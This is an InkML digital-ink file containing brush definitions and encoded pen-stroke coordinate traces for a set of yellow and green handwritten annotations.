  <inkml:trace contextRef="#ctx0" brushRef="#br0">1 4 24575,'3'0'0,"1"-3"0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1:56:28.352"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">1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02:34.505"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">0 1 24575,'0'3'0,"4"2"0,4-1 0,0 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15:26.200"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">0 1 24575,'0'3'0,"4"1"0,3 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22:05.146"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">0 0 24575,'4'0'0,"3"0"0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22:16.952"/>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24:30.794"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">0 0 24575,'4'0'0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23:37.763"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">0 1 24575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26:49.883"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">0 1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29:12.468"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">1 0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35:37.926"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">1 0 24575,'3'0'0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26T22:39:26.527"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.05" units="cm"/>
      <inkml:brushProperty name="height" value="0.05" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">1 0 24575,'0'3'0,"3"2"0,5-1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5:56.349"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#008C3A"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">0 657 24575,'27'-1'0,"0"2"0,0 0 0,-1 2 0,1 1 0,38 11 0,148 63 0,-133-47 0,-51-19 0,60 17 0,-82-27 0,1 1 0,-1 0 0,0 0 0,0 1 0,-1-1 0,1 1 0,6 6 0,-8-6 0,1 0 0,0 0 0,0-1 0,0 1 0,1-1 0,-1-1 0,1 1 0,13 2 0,14 2 0,0 2 0,-1 1 0,50 22 0,-41-15 0,56 15 0,32-7 0,-99-19 0,50 17 0,-19-4 0,265 67 0,-282-74 0,61 25 0,88 33 0,-88-34 0,-57-19 0,-1-1 0,53 9 0,73 19 0,-156-40 0,-1 0 0,23 10 0,-24-8 0,0-1 0,30 6 0,236 40 0,-238-39 0,64 11 0,-67-14 0,49 16 0,-26-7 0,176 42 0,-186-42 0,-39-12 0,0 0 0,31 5 0,-24-6 0,-1 1 0,37 14 0,-39-13 0,0 0 0,-1-1 0,2-1 0,20 2 0,79 14 0,-87-13 0,1-2 0,65 4 0,-77-8 0,0 0 0,0 2 0,0 0 0,0 2 0,21 8 0,28 7 0,-26-8 0,1 3 0,47 24 0,-61-25 0,-15-7 0,1 0 0,32 9 0,22 5 0,120 54 0,-179-72 0,0-1 0,0 0 0,1 0 0,0-1 0,-1-1 0,1 0 0,16-1 0,-15 0 0,0 0 0,0 1 0,0 0 0,-1 1 0,1 1 0,13 4 0,-6 0 0,0-2 0,0 0 0,1-1 0,-1-1 0,25 0 0,-25-2 0,109 19 0,1 2 0,-101-17 0,0 2 0,42 16 0,-1-1 0,116 22 0,-151-34 0,58 10 0,-49-11 0,-29-6 0,0 0 0,21 2 0,-13-3 0,1 2 0,47 12 0,-50-9 0,0-2 0,1-1 0,-1 0 0,24 0 0,-19-3 0,51 10 0,-31-3 0,55 11 0,-67-11 0,0-2 0,0-1 0,39 1 0,-69-6 0,22-1 0,1 1 0,-1 2 0,48 9 0,-40-6 0,0-1 0,0-1 0,1-2 0,38-4 0,6 1 0,-46 4 0,50 8 0,-49-5 0,46 2 0,-45-6 0,39 8 0,-38-4 0,38 1 0,-41-4 0,40 7 0,-40-4 0,41 1 0,50 4 0,1 1 0,5 0-110,0 0-597,-86-9 707,86 17 0,9 1 0,-80-17-421,-22-1 356,55 8 0,-72-6 59,27 6-93,0-3 1,68 3-1,-87-9 179,43 9 1,-43-6-3,42 2 1,46-7-79,84 2 0,-122 10 0,-49-7 0,46 3 0,638-8 582,-682 0-582,46-9 0,-45 5 0,44-1 0,1052 5-472,-508 3 280,-586-4 192,45-8 0,27 0 0,-38 5-91,0-3 0,78-19 1,-20 0 598,-28 8 271,-63 11-639,0 2-1,54-4 1,-56 8-140,40-8 0,-9 1 0,51-11 0,-78 12 0,1 1 0,49-1 0,-61 6 0,38-7 0,-38 4 0,37-1 0,-20 5 0,-5 1 0,0-2 0,48-8 0,64-12 0,-26 9 0,-83 11 0,43-8 0,124-42 0,-20-1 0,-54 14 0,-76 23 93,163-39-778,-164 42 679,143-23-31,-126 32 37,-47 4 0,1-2 0,-1-1 0,51-12 0,128-43 99,81-20 450,-110 32-562,26-2 13,-154 39 0,-36 7 0,1-1 0,26-9 0,-10 1 0,0 1 0,1 1 0,0 1 0,38-3 0,82-10 0,-133 17 0,-1 0 0,1-2 0,-1 0 0,0-1 0,23-13 0,12-4 0,-37 16 0,0 0 0,17-13 0,-20 13 0,0 0 0,0 1 0,26-10 0,89-32 0,-60 23 0,-45 16 0,0 2 0,37-10 0,17-1 0,41-6 0,-94 19 0,-1 0 0,0-1 0,-1-2 0,42-21 0,-18 8 0,25-8 0,-19 8 0,66-37 0,-82 39 0,-25 15 0,1-1 0,-2-1 0,1 0 0,14-12 0,-11 7 0,1 1 0,1 1 0,0 0 0,0 1 0,0 1 0,34-12 0,-48 19 0,202-89 0,-184 79 0,32-21 0,-34 20 0,36-19 0,-19 13 0,48-33 0,-75 45 0,33-21 0,53-33 0,91-56 0,-143 93 0,2 1 0,0 2 0,2 3 0,71-20 0,-94 31 0,-1-1 0,21-10 0,-26 9 0,1 1 0,1 1 0,-1 1 0,21-4 0,4 2 0,0-3 0,0-1 0,67-29 0,63-31 0,-146 61 0,0-2 0,-1 0 0,47-31 0,-62 35 0,8-6 0,33-20 0,-4 6 0,-30 17 0,1 0 0,25-10 0,-30 14 0,0 0 0,0 0 0,-1-2 0,13-9 0,-13 7 0,2 2 0,-1 0 0,19-9 0,-18 11-227,0-1-1,-1-1 1,0 0-1,-1-1 1,18-15-1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5:57.860"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#008C3A"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">0 0 24575,'371'0'0,"-355"1"0,1 1 0,28 6 0,-28-4 0,1-1 0,20 1 0,17-5 0,27 0 0,-76 1 0,1 1 0,-1 0 0,0 0 0,0 1 0,0 0 0,0 0 0,0 0 0,-1 1 0,1 0 0,6 4 0,-8-3 0,1 0 0,-1 0 0,0 0 0,-1 1 0,1-1 0,-1 1 0,0 0 0,0 0 0,0 1 0,-1-1 0,0 1 0,0-1 0,0 1 0,-1-1 0,2 12 0,0 8 0,-1 0 0,-3 35 0,1-42 0,-2 6 0,-1 1 0,-1-1 0,-12 39 0,-3 17 0,7-17 0,-34 100 0,33-128-341,2 1 0,1 0-1,-6 46 1,15-65-6485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5:59.103"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#008C3A"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">0 0 24575,'0'4'0,"0"5"0,0 4 0,0 4 0,0 3 0,0 1 0,0 1 0,0 1 0,0 0 0,0-1 0,0 1 0,0-1 0,0 0 0,0-1 0,0 1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6:01.044"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#008C3A"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">239 23 24575,'-4'2'0,"0"0"0,0 0 0,0 0 0,0 0 0,0 1 0,0-1 0,0 1 0,1 0 0,0 0 0,-1 0 0,1 1 0,-3 3 0,-2 2 0,-41 49 0,39-44 0,0-1 0,-1-1 0,0 0 0,-23 19 0,31-29 0,0 1 0,1-1 0,-1 1 0,0 0 0,1 0 0,0 0 0,0 1 0,0-1 0,0 0 0,0 1 0,1-1 0,-1 1 0,0 4 0,-9 54 0,5-25 0,4-26 0,0 1 0,0-1 0,2 1 0,-1-1 0,1 1 0,1-1 0,0 1 0,2 11 0,-1-18 0,0 1 0,0-1 0,0 1 0,0-1 0,1 0 0,0 1 0,0-1 0,0-1 0,1 1 0,0 0 0,0-1 0,0 0 0,0 0 0,1 0 0,-1 0 0,1-1 0,7 4 0,52 36 0,-50-31 0,1-2 0,0 0 0,0-1 0,1-1 0,20 8 0,-20-11 0,1-2 0,25 3 0,13 2 0,-14-3 0,0-1 0,0-1 0,65-6 0,-17 1 0,-5 4 0,92-5 0,-170 3 0,1-1 0,-1 0 0,0 0 0,0-1 0,0 0 0,0 0 0,0 0 0,0-1 0,0 0 0,-1 0 0,1-1 0,-1 1 0,0-1 0,7-7 0,-2-1 0,0 0 0,-1 0 0,0-1 0,11-25 0,10-13 0,-22 41 0,-1-1 0,-1 0 0,0 0 0,0-1 0,-1 1 0,-1-1 0,0-1 0,0 1 0,-2 0 0,3-18 0,-5 29 0,1-27 0,1 1 0,8-34 0,-9 54 0,1 1 0,-1 0 0,-1-1 0,1 1 0,-1 0 0,0-1 0,0 1 0,-2-11 0,1 14 0,0 0 0,0 0 0,-1 0 0,1 0 0,-1 0 0,0 1 0,1-1 0,-1 0 0,0 1 0,-1-1 0,1 1 0,0 0 0,-1 0 0,1 0 0,-1 0 0,0 0 0,1 1 0,-6-3 0,-141-75 0,137 73 0,0 0 0,0 1 0,-1 1 0,0 0 0,0 0 0,0 2 0,0-1 0,-1 2 0,-22-1 0,18 3-112,3 0-27,0-1 0,1 0-1,-1-1 1,0-1 0,1 0 0,-1 0-1,1-2 1,-23-8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6:05.225"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#008C3A"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">20600 1913 24575,'-3'-1'0,"-1"0"0,1-1 0,0 1 0,0-1 0,1 1 0,-1-1 0,0 0 0,0 0 0,1 0 0,-1-1 0,-2-3 0,-9-6 0,-6-2 0,4 1 0,-2 1 0,1 1 0,-2 1 0,-27-12 0,32 16 0,1-1 0,0-1 0,1 0 0,0 0 0,0-1 0,1-1 0,0 0 0,-14-16 0,11 10 0,-2 1 0,0 1 0,-19-13 0,4 8 0,-38-16 0,58 29 0,0-2 0,0 1 0,0-1 0,1-1 0,-12-12 0,9 8 0,-30-22 0,-121-86 0,156 114 0,-36-24 0,26 19 0,0-1 0,-24-24 0,23 19 0,-1 1 0,-37-26 0,48 39 0,1 0 0,-1 0 0,0 0 0,-1 1 0,1 1 0,-17-3 0,17 3 0,-1 0 0,1 0 0,0 0 0,0-1 0,1-1 0,-1 0 0,-13-7 0,-106-79 0,110 78 0,0 1 0,-1 1 0,-22-9 0,-3-1 0,4 1 0,-39-21 0,66 30 0,-1 2 0,-1 0 0,0 0 0,0 2 0,0 0 0,0 0 0,-1 2 0,0 0 0,-22-3 0,19 4 0,0 0 0,0-2 0,0 0 0,0-1 0,1-1 0,0 0 0,1-2 0,-26-15 0,19 11 0,-34-11 0,-8-4 0,41 17 0,-54-16 0,54 20 0,-1-2 0,-32-15 0,41 16 0,0 2 0,0 0 0,-1 1 0,0 1 0,-22-2 0,15 2 0,-45-13 0,36 4 0,-1 2 0,0 1 0,-1 2 0,0 2 0,-56-3 0,71 7 0,1 0 0,-1-2 0,1 0 0,0-1 0,0-1 0,1 0 0,-29-15 0,36 17 0,0 0 0,0 0 0,0 1 0,0 1 0,-14-1 0,12 1 0,-1 0 0,1-1 0,-20-6 0,-136-48 0,10 13 0,52 22 0,75 14 0,7 1 0,0 2 0,-54-5 0,49 8 0,-33-7 0,34 4 0,-42-1 0,35 4 0,-45-8 0,7 0 0,-55-10 0,80 10 0,34 6 0,-1 0 0,-31-1 0,-14 4 0,22 2 0,0-3 0,-57-9 0,-77-11 0,35 1 0,49 8 0,16 4 0,-34-1 0,71 8 0,-36-7 0,34 4 0,-1 2 0,0 1 0,-40 4 0,-68-3 0,76-10 0,46 7 0,-50-4 0,-532 9 0,577-2 0,-47-9 0,45 5 0,-42-1 0,-880 7 0,939-2 0,-1-1 0,-28-6 0,27 4 0,1 1 0,-22-1 0,-535 2 0,280 4 0,273-2 0,1 1 0,-1 1 0,-35 8 0,-1 1 0,-92 6 0,104-13 0,-14 6 0,43-6 0,0-1 0,-23 1 0,19-2 0,-35 7 0,35-5 0,-37 3 0,-6-7 0,34-1 0,0 2 0,1 0 0,-50 10 0,54-7 0,0-1 0,-1-1 0,1-1 0,-29-2 0,-48 1 0,-17 21 0,71-19 0,-49 10 0,-47 10 0,110-18 0,-1-1 0,-48-2 0,48-2 0,0 2 0,-49 7 0,10 2 0,-1-4 0,-131-6 0,84-2 0,56 2 0,-3-2 0,0 4 0,-69 11 0,84-7 0,0-2 0,-58-4 0,59-1 0,1 3 0,-66 9 0,76-7 0,0 0 0,-67-5 0,-30 3 0,62 8 0,47-5 0,-48 2 0,-698-8 0,752 2 0,0 2 0,0 0 0,-39 12 0,38-9 0,0 0 0,0-2 0,-32 2 0,21-3 0,1 1 0,-56 14 0,11-1 0,-73 7 0,51-5 0,9 0 0,24-8 0,37-5 0,-1-2 0,-35 1 0,-113 9 0,98-5 0,14 1 0,39-6 0,-46 3 0,40-7 0,0 2 0,-47 8 0,43-5 0,1-1 0,-1-3 0,-44-3 0,-65 3 0,89 10 0,43-8 0,0 0 0,-23 2 0,18-5 0,1 1 0,-1 1 0,1 1 0,0 1 0,0 1 0,0 1 0,1 0 0,-28 14 0,34-15 0,0 0 0,0-1 0,0-1 0,0 0 0,-26 2 0,21-4 0,0 2 0,-25 7 0,-260 73 0,150-55 0,131-25 0,1 2 0,-27 8 0,25-6 0,-37 7 0,-72 16 0,102-21 0,0-1 0,-1-1 0,0-2 0,-40 1 0,54-5 0,1 1 0,0 0 0,1 1 0,-32 11 0,31-9 0,0 0 0,0-1 0,-1-1 0,-25 2 0,-2-1 0,-1 2 0,1 2 0,-57 17 0,49-12 0,37-9 0,-13 4 0,0-2 0,-1-1 0,-42 2 0,42-4 0,0 1 0,1 2 0,-1 0 0,-43 17 0,21-7 0,14-5 0,-55 7 0,52-10 0,-54 18 0,55-14 0,-49 8 0,74-17 0,-1 0 0,-25 11 0,29-9 0,0-1 0,0 0 0,-1-1 0,1-1 0,-16 2 0,-6-2 0,0 0 0,0 3 0,0 0 0,1 2 0,-1 2 0,-53 21 0,59-20 0,0-1 0,0-2 0,-1 0 0,-56 5 0,82-12 0,-40 4 0,31-4 0,1 0 0,0 1 0,0 1 0,0 0 0,0 0 0,0 1 0,0 0 0,-10 6 0,2-1 0,0-1 0,-35 9 0,-10 3 0,42-12 0,-1-1 0,-37 5 0,34-7 0,-44 13 0,-126 48 0,162-55 0,-51 10 0,-24 6 0,77-16 0,-38 5 0,39-10 0,-50 17 0,35-6 0,-1-2 0,-49 9 0,21-16 0,55-6 0,0 0 0,1 1 0,0 1 0,-25 8 0,-74 24 0,-63 25 0,169-56 0,0-1 0,0 0 0,-15 2 0,16-4 0,-1 1 0,1 1 0,0 0 0,-13 5 0,4 0 0,-1-1 0,0-1 0,0-1 0,-26 3 0,18-4 0,-41 14 0,63-16-124,1 0 0,-1-1 0,0 1 0,1-1 0,-1 0 0,0 0-1,0-1 1,0 0 0,0 0 0,-6-1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6:06.469"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#008C3A"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">440 1 24575,'-3'1'0,"1"1"0,-1 0 0,1 0 0,-1 0 0,1 0 0,0 1 0,0-1 0,0 0 0,0 1 0,0 0 0,0-1 0,-1 5 0,-5 5 0,-11 11 0,-1-1 0,-23 21 0,34-35 0,-1 0 0,0 0 0,-1-1 0,0 0 0,0-1 0,-1-1 0,-14 6 0,19-8 0,0 0 0,1 0 0,0 0 0,-1 1 0,1 0 0,1 0 0,-1 1 0,1-1 0,-1 1 0,1 1 0,1-1 0,-1 1 0,1-1 0,0 1 0,-6 12 0,-25 31 0,7-22 0,-9 12 0,35-36 0,-2 1 0,1 1 0,0-1 0,0 1 0,1-1 0,-1 1 0,1 0 0,-3 8 0,5-11 0,0 0 0,0 0 0,0-1 0,0 1 0,1 0 0,-1-1 0,0 1 0,1 0 0,-1-1 0,1 1 0,0 0 0,-1-1 0,1 1 0,0-1 0,0 1 0,0-1 0,0 0 0,0 1 0,0-1 0,1 0 0,-1 0 0,0 1 0,1-1 0,-1 0 0,1 0 0,-1-1 0,1 1 0,1 1 0,16 7 0,1 0 0,-1-1 0,1-1 0,36 8 0,4 2 0,-17 1 0,6 3 0,-11-9 0,48 21 0,5 2 0,-89-34 0,178 63 0,-166-56-1365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6:08.824"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#008C3A"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">1 69 24575,'0'-2'0,"1"1"0,-1-1 0,1 0 0,-1 1 0,1-1 0,0 0 0,0 1 0,-1-1 0,1 1 0,0 0 0,1-1 0,-1 1 0,0 0 0,0-1 0,0 1 0,1 0 0,-1 0 0,1 0 0,-1 0 0,1 0 0,2 0 0,39-18 0,-34 16 0,1-1 0,0 1 0,0 1 0,0-1 0,1 1 0,-1 1 0,1 0 0,0 1 0,16 1 0,-24-1 0,1 0 0,-1 1 0,0-1 0,1 1 0,-1 0 0,0 0 0,0 0 0,0 0 0,0 1 0,0-1 0,0 1 0,0 0 0,0 0 0,0 0 0,-1 0 0,1 0 0,-1 1 0,1-1 0,-1 1 0,0-1 0,0 1 0,0 0 0,-1 0 0,1 0 0,-1 0 0,1 0 0,-1 0 0,0 0 0,1 6 0,0 15 0,0 0 0,-2 0 0,-3 26 0,0 6 0,1-38 0,0-1 0,-2 1 0,0-1 0,-1 0 0,-1-1 0,-16 32 0,9-18 0,-40 59 0,57-90 0,0 1 0,0 0 0,0-1 0,1 0 0,-1 0 0,0 0 0,7-4 0,182-87 0,-177 85-44,0 1 0,0 1 0,18-4 0,-12 4-1145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05T12:46:11.427"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#008C3A"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">544 24 24575,'-26'-1'0,"15"0"0,-1 1 0,1 0 0,-1 1 0,1 0 0,-1 0 0,1 1 0,-1 1 0,1 0 0,0 0 0,-20 10 0,-32 15 0,54-25 0,0 0 0,0 0 0,0 1 0,0 1 0,1-1 0,0 1 0,0 1 0,0-1 0,1 1 0,0 1 0,0-1 0,-10 13 0,-17 27 0,24-34 0,1 0 0,0 1 0,1 0 0,0 0 0,1 0 0,0 1 0,-8 25 0,13-32 0,-1 0 0,1 0 0,-2 0 0,1-1 0,-1 1 0,0-1 0,-5 6 0,5-7 0,0 0 0,0 1 0,1-1 0,-1 1 0,2 0 0,-1 0 0,0 0 0,1 0 0,0 1 0,-1 7 0,-6 50 0,3-31 0,2 0 0,0 40 0,4-64 0,1 1 0,-1-1 0,2 0 0,-1 0 0,2 1 0,-1-1 0,1 0 0,0-1 0,1 1 0,0 0 0,0-1 0,8 11 0,9 10 0,24 29 0,-41-53 0,0 0 0,0 0 0,-1 1 0,0-1 0,4 8 0,-6-8 0,1-1 0,0 0 0,0 0 0,1 0 0,0 0 0,-1 0 0,1-1 0,0 1 0,1-1 0,-1 0 0,7 5 0,9 2 0,33 14 0,1 0 0,-38-17 0,0 0 0,1-2 0,0 0 0,0 0 0,30 3 0,-8-4 0,53-1 0,-35-2 0,-19 0 0,48-5 0,-75 3 0,0 0 0,-1-1 0,1 0 0,-1-1 0,1 0 0,-1-1 0,0 0 0,0 0 0,15-10 0,15-12 0,-29 20 0,0 0 0,-1 0 0,1-1 0,-2-1 0,1 0 0,8-9 0,31-39 0,-24 30 0,24-35 0,-41 50 0,-1 0 0,0 0 0,0-1 0,-1 1 0,0-1 0,5-25 0,12-71 0,-18 91 0,0-1 0,10-24 0,-8 25 0,0-1 0,4-21 0,-7 24 0,1 0 0,9-24 0,-8 28 0,-1-1 0,0 1 0,-1-1 0,-1 0 0,2-14 0,-4 21 0,2-14 0,-1 0 0,-2-1 0,1 1 0,-5-22 0,4 36 0,-1 0 0,1-1 0,-1 2 0,0-1 0,0 0 0,0 0 0,-1 0 0,0 1 0,0 0 0,0-1 0,0 1 0,-1 0 0,1 1 0,-1-1 0,0 0 0,0 1 0,0 0 0,-1 0 0,-8-4 0,-11-3 0,1 0 0,-1 2 0,0 1 0,-49-7 0,22 4 0,29 6 0,0 0 0,-35-1 0,14 5-1365,24 1-5461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25.030"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">1 1 24575,'1'0'0,"1"1"0,-1 0 0,0 0 0,1-1 0,-1 1 0,0 0 0,0 0 0,0 0 0,1 0 0,-1 0 0,0 1 0,0-1 0,-1 0 0,1 0 0,0 1 0,0-1 0,0 3 0,13 25 0,-11-15 0,0 1 0,0-1 0,-2 1 0,1 0 0,-2 18 0,0-14 0,0 0 0,6 27 0,-1-10-455,0-1 0,-2 68 0,-3-85-6371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27.133"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">134 220 24575,'0'11'0,"-1"1"0,-1-1 0,0 1 0,-1-1 0,0 0 0,0 0 0,-1 0 0,-1 0 0,0 0 0,0-1 0,-1 0 0,-14 18 0,8-9 0,0 1 0,1 0 0,-14 39 0,21-50 0,2 1 0,-1-1 0,1 1 0,1 0 0,0-1 0,0 1 0,1 0 0,0 0 0,0 0 0,1 0 0,4 13 0,-4-17 0,1-1 0,0 1 0,1-1 0,-1 0 0,1 0 0,0 0 0,0 0 0,1 0 0,0-1 0,7 8 0,3 0 0,1 0 0,17 10 0,24 20 0,-42-30 0,1 0 0,0-1 0,1-1 0,0-1 0,34 15 0,-29-16 0,1-2 0,1 0 0,-1-1 0,37 3 0,92-5 0,-102-4 0,-43 1 0,1 0 0,-1-1 0,0 0 0,1-1 0,-1 1 0,0-1 0,0-1 0,0 1 0,8-5 0,48-35 0,-19 11 0,-34 25 0,0 0 0,-1 0 0,0 0 0,0-1 0,11-13 0,-15 16 0,-2 0 0,1-1 0,0 0 0,-1 1 0,0-1 0,0 0 0,0 0 0,-1 0 0,0 0 0,1 0 0,-2 0 0,1-1 0,-1-4 0,0-236 0,-2 99 0,0 131 0,0 0 0,-1 0 0,-1 0 0,0 1 0,-1 0 0,-1-1 0,-1 2 0,-14-26 0,19 36 0,-1 0 0,-1 0 0,1 0 0,-1 0 0,1 0 0,-1 1 0,0 0 0,-1-1 0,1 1 0,0 1 0,-1-1 0,0 1 0,1 0 0,-10-3 0,-7-1 0,-1 0 0,-27-2 0,-11-3 0,18-4 0,32 11 0,1 0 0,-1 1 0,0 0 0,-1 1 0,-15-2 0,6 3-1365,1 1-5461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29.598"/>
    </inkml:context>
    <inkml:brush xml:id="br0">
      <inkml:brushProperty name="width" value="0.1" units="cm"/>
      <inkml:brushProperty name="height" value="0.1" units="cm"/>
      <inkml:brushProperty name="color" value="#FFC114"/>
    </inkml:brush>
  </inkml:definitions>
  <inkml:trace contextRef="#ctx0" brushRef="#br0">0 0 24575,'22'1'0,"-1"0"0,0 1 0,31 7 0,-16-1 0,-21-6 0,0 2 0,0-1 0,0 2 0,0 0 0,-1 1 0,16 8 0,-19-8 0,1-1 0,0-1 0,0 0 0,1-1 0,-1 0 0,1 0 0,15 0 0,-11-1 0,-1 0 0,0 1 0,28 10 0,24 8 0,-48-16 0,37 15 0,-38-12 0,0-1 0,1 0 0,0-2 0,1 0 0,40 3 0,-30-3 0,41 11 0,-48-10 0,-1 0 0,1-2 0,41 2 0,-57-6 0,2 0 0,0 0 0,-1 0 0,1 0 0,0 1 0,-1 1 0,1 0 0,-1 0 0,0 1 0,1 0 0,9 5 0,9 5 0,51 15 0,-51-18 0,-8-5 0,0 0 0,28 2 0,-27-4 0,-1 0 0,28 9 0,-6 2 0,1-2 0,46 8 0,19 0 0,25 2 0,-14 2 0,-46-6 0,37 6 0,-60-16 0,-23-3 0,47 3 0,-56-7 0,0 2 0,-1 0 0,1 1 0,19 7 0,-19-6 0,-1 0 0,1-1 0,0-1 0,20 2 0,34 1-33,-1 3-1,0 3 0,94 30 1,-71-18-659,178 36 692,-82-23 0,-159-32-22,-2-2 192,-1 2 0,1 0-1,-2 2 1,40 15-1,-54-17-169,0-1 0,1 0 0,-1-1 0,1 0 0,19 1 0,-21-3 0,-7 0 0,-1 0 0,0 0 0,0 1 0,0-1 0,0 1 0,0 0 0,0 0 0,0 1 0,-1-1 0,1 1 0,-1 0 0,6 5 0,-6-5 0,0 0 0,1 1 0,0-2 0,0 1 0,0 0 0,0-1 0,0 1 0,0-1 0,1 0 0,-1-1 0,8 3 0,13 0 0,1 2 0,-1 0 0,-1 2 0,42 19 0,-19-8 0,58 17 0,-64-23 0,49 8 0,-65-17 0,-1 1 0,41 15 0,-32-9 0,0-1 0,1-2 0,0-1 0,39 2 0,-42-5 0,2 2 0,42 13 0,-7-2 0,106 26 0,56 24 0,-154-42 0,15 10 0,-60-22 0,0-2 0,50 13 0,110 19 0,-158-36 0,-1 1 0,50 21 0,-49-17 0,0 0 0,42 7 0,8 1 0,-61-13 0,1-2 0,-1 0 0,45 3 0,-39-5 0,0 0 0,0 2 0,-1 1 0,1 2 0,-1 0 0,32 15 0,-28-10 0,1-2 0,0-1 0,37 6 0,-30-9 0,0 2 0,54 20 0,-75-21 0,1-1 0,0 0 0,0-1 0,0-1 0,1-1 0,-1-1 0,26 1 0,-30-2 0,0 0 0,0 1 0,0 0 0,27 10 0,28 7 0,-36-15 0,96 21 0,-65 0 0,-55-21 0,0 0 0,1-1 0,0 0 0,0-1 0,0 0 0,0 0 0,13 0 0,-14-2 0,1 1 0,0 0 